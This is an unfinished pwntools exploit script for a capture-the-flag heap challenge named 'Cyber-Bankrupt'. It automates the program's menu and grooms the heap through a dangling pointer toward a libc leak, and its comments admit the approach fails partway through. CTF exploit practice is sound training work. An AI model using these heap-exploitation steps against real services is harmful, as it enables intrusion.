#!/usr/bin/env python3
from pwn import *
import sys

context.binary = ELF('/home/gluppler/Downloads/CTFs-Testing/Pwn/Medium/Cyber-Bankrupt/challenge/cyber_bankrupt')
libc = ELF('/home/gluppler/Downloads/CTFs-Testing/Pwn/Medium/Cyber-Bankrupt/challenge/glibc/libc.so.6')

HOST = sys.argv[1] if len(sys.argv) > 1 else '127.0.0.1'
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 9999

LOCAL = HOST in ('127.0.0.1', 'localhost')
if LOCAL:
    p = process(['./glibc/ld-linux-x86-64.so.2', './cyber_bankrupt'],
                cwd='/home/gluppler/Downloads/CTFs-Testing/Pwn/Medium/Cyber-Bankrupt/challenge')
else:
    p = remote(HOST, PORT)

PIN = b'6969'

def menu(idx):
    p.sendlineafter(b'> ', str(idx).encode())

def transfer(amount, data, bank_id=0):
    menu(1)
    p.sendlineafter(b'Enter Bank ID: ', str(bank_id).encode())
    p.sendlineafter(b'Enter amount you want to transfer: ', str(amount).encode())
    p.sendafter(b'Enter receiver: ', data)

def clear_history(bank_id=0):
    menu(2)
    p.sendlineafter(b'Enter Bank ID: ', str(bank_id).encode())

def view_details(bank_id=0):
    menu(3)
    p.sendlineafter(b'Enter Bank ID: ', str(bank_id).encode())
    return p.recvline()

# --- Start ---
p.recvuntil(b'pin:')
p.sendline(PIN)

# Step 1: Alloc 0x500 chunk A, then alloc small chunk B as barrier
log.info("Step 1: Allocating barrier chunk then large chunk")
# First alloc small chunk (0x20) as barrier at bottom
# Actually, alloc in reverse order: large first, then small barrier
transfer(0x500, b'A' * 1)  # Only send 1 byte to avoid acc[read_len] crash
# After this, acc[0] = A (0x510 chunk)

# Now alloc 0x20 chunk B (barrier between A and top)
transfer(0x20, b'B' * 8)  # Send 8 bytes
# After this, acc[0] = B. A is leaked but still allocated.

log.info("Step 2: Free B (tcache), then free A (unsorted bin)")
clear_history()  # Free B (0x30 chunk → tcache[0x20])
# We want to free A now, but acc[0] = B (dangling after free).
# We have no pointer to A!

# Hmm, need different approach. Let me try the classic technique:
# Just alloc one chunk, free it (unsorted bin if large enough), check if consolidates

p.close()
